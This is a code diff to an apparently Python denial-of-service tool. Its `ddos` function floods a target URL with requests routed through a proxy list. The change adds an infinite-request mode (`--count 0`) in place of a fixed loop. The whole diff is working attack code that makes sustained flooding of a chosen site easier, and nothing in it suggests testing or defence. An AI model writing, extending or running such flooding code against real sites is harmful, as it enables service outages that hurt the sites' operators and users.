@@ -45,7 +45,11 @@ def get_proxy(proxy_iterator: Iterable[str]) -> str:
 
 
 async def ddos(target_url: str, timeout: int, count: int, verbose: bool, proxy_iterator: Iterable[Tuple[str, str, int]]):
-    for _ in range(count):
+    step = 0
+    while True:
+        if count and step > count:
+            break
+        step += 1
         proxy = get_proxy(proxy_iterator)
         await make_request(target_url, proxy, verbose, timeout)
 
@@ -63,7 +67,7 @@ async def amain(target_url: str, timeout: int, concurrency: int, count: int, ver
 @click.option('--proxy-url', help='url to proxy resourse')
 @click.option('--proxy-file', help='path to file with proxy list')
 @click.option('--concurrency', help='concurrency level', type=int, default=1)
-@click.option('--count', help='requests count', type=int, default=1)
+@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
 @click.option('--timeout', help='requests timeout', type=int, default=5)
 @click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
 def main(target_url: str, proxy_url: str, proxy_file: str, concurrency: int, count: int, timeout: int, verbose: bool):
